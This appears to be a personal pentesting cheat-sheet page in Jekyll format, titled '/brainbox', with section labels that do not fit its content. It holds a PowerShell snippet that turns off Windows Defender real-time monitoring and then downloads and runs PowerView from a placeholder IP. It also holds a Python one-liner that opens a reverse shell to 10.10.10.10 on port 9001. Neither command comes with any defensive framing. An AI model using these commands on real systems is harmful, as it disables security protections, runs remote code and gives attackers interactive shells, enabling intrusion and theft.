---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE

<details><summary> <b>API</b> </summary><blockquote>
  <details><summary>REST</summary><blockquote>
     # Patch AMSI or disable AV
    <br>
    ```powershell
      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_Dev.ps1')
    ```

  </blockquote></details>
  <details><summary>SOAP</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>




```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```